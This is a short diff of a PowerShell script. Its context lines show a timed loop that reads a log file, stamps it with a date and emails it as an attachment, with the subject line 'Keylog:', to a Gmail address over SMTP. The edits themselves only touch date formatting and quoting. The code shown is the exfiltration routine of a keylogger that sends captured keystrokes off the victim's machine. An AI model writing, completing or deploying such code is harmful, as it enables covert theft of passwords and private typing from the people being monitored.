@@ -41,12 +41,12 @@ while($true){
   if($min -ge $period){
     $content = Get-Content 'C:\users\hilld\file.txt'
     if($content.Count -ne 3 -Or $content[2] -ne ''){
-      $eDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
+      $eDate = Get-Date -Format "MM/dd/yyyy-HH:mm:ss"
       Add-Content $path $eDate
       $ReportEmail = New-Object System.Net.Mail.MailMessage
       $ReportEmail.From = $gmail
       $ReportEmail.To.Add($gmail)
-      $ReportEmail.Subject = 'Keylog: ' + $sDate + ' >> ' + $eDate
+      $ReportEmail.Subject = 'Keylog: ' + $sDate + " >> " + $eDate
       $ReportEmail.Attachments.Add($path)
       $SMTPInfo.Send($ReportEmail)
       $ReportEmail.Dispose()
